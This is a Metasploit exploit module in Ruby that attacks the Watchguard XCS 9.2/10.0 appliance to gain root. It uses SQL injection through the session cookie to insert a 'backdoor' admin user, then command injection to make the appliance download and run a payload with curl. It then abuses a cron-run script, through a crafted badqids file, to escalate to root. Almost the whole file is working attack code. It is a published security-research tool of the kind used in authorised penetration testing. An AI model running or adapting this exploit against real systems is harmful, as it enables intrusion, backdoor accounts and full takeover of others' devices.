##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Watchguard XCS Unauthenticated Remote Root',
      'Description'    => %q{
        This module exploits three seperate vulnerabilities found in the Watchguard XCS virtual appliance
        to gain a root shell. By exploiting an unauthenticated SQL injection vulnerability, a remote attacker may insert
        a valid web user into the appliance database, and login to the web interface as this user. A
        vulnerability in the web interface allows the attack to inject operating system commands as the
        'nobody' user. A further vulnerability in the 'FixCorruptMail' script called by root's crontab can then be exploited
        to run a command as root within 3 minutes.
      },
      'Author'         =>
        [
          'Daniel Jensen <daniel.jensen[at]security-assessment.com>' # discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL','http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf']
        ],
      'Platform'       => 'bsd',
      'Arch'           => ARCH_X86_64,
      'Privileged'     => false,
      'Targets'        =>
        [
          [ 'Watchguard XCS 9.2/10.0', { }]
        ],
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 29 2015'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptString.new('USERNAME', [true, 'Add web interface user account', 'backdoor']),
        OptString.new('PASSWORD', [true, 'Web interface user password', 'backdoor']),
        OptBool.new('GETROOT', [false, 'Exploit the root privesc (Takes up to 180 seconds)', true]),
        Opt::RPORT(443)
      ],
      self.class
    )
  end

  def check
    #Check to see if the SQLi is present
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),
      'cookie' => "sid=1'"
     })
     if res and res.body =~ /unterminated quoted string/
       return Exploit::CheckCode::Vulnerable
     end
     return Exploit::CheckCode::Safe
  end


  def exploit
    #Generate the password hash
    pwd_clear = datastore['PASSWORD']
    pwd_hash = generate_device_hash(pwd_clear)
    username = datastore['USERNAME']
    user_id = rand(999)

    sid_cookie = attempt_login(username, pwd_clear)
    unless sid_cookie
      vprint_status("Failed to login, attempting to add backdoor user...")
      unless add_user(user_id, username, pwd_hash, pwd_clear)
        fail_with(Failure::Unknown, "Failed to add user account to database.")
      end
      sid_cookie = attempt_login(username, pwd_clear)
      unless (sid_cookie)
        fail_with(Failure::Unknown, "Unable to login with user account.")
      end
    end

    #Check if cmd injection works
    test_cmd_inj = send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, "id")
    unless test_cmd_inj and test_cmd_inj.body =~ /uid=65534/
      fail_with(Failure::UnexpectedReply, "Could not inject command")
    end

    #We have cmd exec, stand up an HTTP server and deliver the payload
    vprint_status("Getting ready to drop binary on appliance")

    downfile = rand_text_alpha(8+rand(8))
    vprint_status("File name is #{downfile}")

    #Generate payload
    @pl = generate_payload_exe
    @elf_sent = false
    waited = 0
    while (not @pl)
      print_status("Waiting for payload to finish generating...")
      select(nil,nil,nil,1)
      waited += 1
      if (waited > 20)
        fail_with(Failure::Unknown, "Unable to generate payload within a reasonable time.")
      end
    end

    resource_uri = '/' + downfile

    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end

    service_url = 'https://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
    print_status("Starting up our web service on #{service_url} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
      on_request_uri(cli, req)
      },
      'Path' => resource_uri
    }})

    filename = rand_text_alpha_lower(8)
    vprint_status("Asking the appliance to download #{service_url}")

    #Use the cmd exec to pull in shell
    dnld_cmd1 = "/usr/local/sbin/curl -k #{service_url} -o /tmp/#{filename}"
    vprint_status("Telling appliance to run #{dnld_cmd1}")
    send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, dnld_cmd1)
    register_file_for_cleanup("/tmp/#{filename}")

    #Wait for payload to be requested by appliance
    wait_for_payload

    #Chmod the shell binary
    chmod_cmd = "chmod +x /tmp/#{filename}"
    vprint_status("Chmoding payload #{downfile}...")
    send_cmd_exec("/ADMIN/mailqueue.spl",sid_cookie, chmod_cmd)

    if(datastore['GETROOT'] == true)
      print_status("GETROOT set to true, we will use 'FixCorruptMail' privesc")
      get_root(sid_cookie,filename)
    else
      print_status("GETROOT set to false, setting up a shell as 'nobody'")
      exec_cmd = "/tmp/#{filename}"
      vprint_status("Running payload #{downfile}...")
      send_cmd_exec("/ADMIN/mailqueue.spl",sid_cookie, exec_cmd, true)
    end

  end

  def attempt_login(username,pwd_clear)
    #Attempts to login with the provided user credentials
    #Get the login page
    get_login_hash = send_request_cgi({
    'uri' => normalize_uri(target_uri.path, '/login.spl')
    })

    unless get_login_hash and get_login_hash.body
      fail_with(Failure::Unreachable, "Could not get login page.")
    end

    #Find the hash token needed to login
    login_hash = ''
    get_login_hash.body.each_line do |line|
    next if line !~ /name="hash" value="(.*)"/
      login_hash = $1
    end

    sid_cookie = (get_login_hash.get_cookies || '').scan(/sid=(\w+);/).flatten[0] || ''
    if login_hash == '' || sid_cookie == ''
      fail_with(Failure::UnexpectedReply, "Could not find login hash or cookie")
    end

    login_post = {
      'u' => "#{username}",
      'pwd' => "#{pwd_clear}",
      'hash' => login_hash,
      'login' => "Login"
    }
    print_status("Attempting to login with provided credentials")
    login = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/login.spl'),
      'method' => 'POST',
      'encode_params' => false,
      'cookie' => "sid=#{sid_cookie}",
      'vars_post' => login_post,
      'vars_get' => {
        'f' => 'V'
      }
    })


    unless login and login.body =~ /<title>Loading...<\/title>/
      return false
    end

    print_status("Successfully logged in")
    return sid_cookie
  end

  def add_user(user_id, username, pwd_hash, pwd_clear)
    #Adds a user to the database using the unauthed SQLi
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),
      'cookie' => "sid=1%3BINSERT INTO sds_users (self, login, password, org, priv_level, quota, disk_usage) VALUES(#{user_id}, '#{username}', '#{pwd_hash}', 0, 'server_admin', 0, 0)--"
    })

    unless res and res.body
      fail_with(Failure::Unreachable, "Could not connect to host")
    end

    if res.body =~ /ERROR:  duplicate key value violates unique constraint/
      print_status("Added backdoor user, credentials => #{username}:#{pwd_clear}")
    else
      fail_with(Failure::UnexpectedReply, "Unable to add user to database")
    end
    return true
  end

  def get_root(sid_cookie,filename)
    print_status("Rooting can take up to 3 minutes, if you want quicker access retry with GETROOT => false")

    #Touch dummy file as part of privesc
    dummy_filename = rand_text_alpha_lower(8)
    touch_cmd="touch /tmp/#{dummy_filename}"
    vprint_status("Creating dummy file...")
    send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, touch_cmd)

    #Put the shell injection line into badqids
    setup_privesc = "echo \"../../../../../../tmp/#{dummy_filename};/tmp/#{filename}\" > /var/tmp/badqids"
    send_cmd_exec("/ADMIN/mailqueue.spl", sid_cookie, setup_privesc, true)

    #Need both these files to exploit privesc, delete them once shell opened
    register_file_for_cleanup("/var/tmp/badqids")
    register_file_for_cleanup("/tmp/#{dummy_filename}")

    #Wait for crontab to run vulnerable script
    print_status("Badqids created, waiting for vulnerable script to be called by crontab...")
    select(nil,nil,nil,180) #Wait 3 minutes to ensure cron script is run
    print_status("Ran out of time, should have root shell by now.")

  end

  def generate_device_hash(cleartext_password)
    #Generates the specific hashes needed for the XCS
    pre_salt = "BorderWare "
    post_salt = " some other random (9) stuff"
    hash_tmp = Rex::Text.md5(pre_salt + cleartext_password + post_salt)
    final_hash = Rex::Text.md5(cleartext_password + hash_tmp)
    return final_hash
  end

  def send_cmd_exec(uri,sid_cookie,os_cmd, blocking=false)
  #This is a handler function that makes HTTP calls to exploit the command injection issue
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "#{uri}"),
      'cookie' => "sid=#{sid_cookie}",
      'encode_params' => true,
      'vars_get' => {
        'f' => 'dnld',
        'id' => ";#{os_cmd}"
      }
    })

    #Handle cmd exec failures
    if (!res and blocking == false)
      fail_with(Failure::Unknown, "Failed to exploit command injection.")
    end

    return res
  end

  #Handle incoming requests from the server
  def on_request_uri(cli, request)
    vprint_status("on_request_uri called: #{request.inspect}")
    print_status("Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  #Wait for the data to be sent
  def wait_for_payload
    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > 10)
        fail_with(Failure::Unknown, "Target didn't request the payload.")
      end
    end
  end
end
